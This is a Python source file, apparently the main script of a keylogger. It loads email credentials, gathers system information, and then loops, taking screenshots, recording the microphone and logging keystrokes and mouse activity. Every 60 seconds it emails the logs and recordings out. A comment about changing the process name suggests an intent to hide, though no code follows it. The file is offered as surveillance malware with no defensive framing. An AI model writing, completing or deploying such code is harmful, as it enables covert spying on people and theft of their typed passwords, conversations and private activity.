from dotenv import load_dotenv
import os
from input_capture import save_data, on_move, on_click, on_scroll
from system_utils import system_information, screenshot, microphone
from reporting import report
from pynput import keyboard
from pynput.mouse import Listener
import time
# Load environment variables
load_dotenv()
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
SEND_REPORT_EVERY = 60  # seconds
LOG_FILE = "keylogger_logs.txt"
import sys
import os
import ctypes

# Change process name

def main():
    # Collect system info
    system_information()

    while True:
        # Capture screenshot and save the file
        screenshot_path = screenshot()

        # Record microphone audio
        audio_path = microphone(SEND_REPORT_EVERY)

        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=save_data)
        keyboard_listener.start()

        # Start mouse listener
        mouse_listener = Listener(on_click=on_click, on_move=on_move, on_scroll=on_scroll)
        mouse_listener.start()

        # Send report with attachments
        report(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY, LOG_FILE, [screenshot_path, audio_path])

        # Wait for the next reporting interval
        time.sleep(SEND_REPORT_EVERY)

if __name__ == "__main__":
    main()
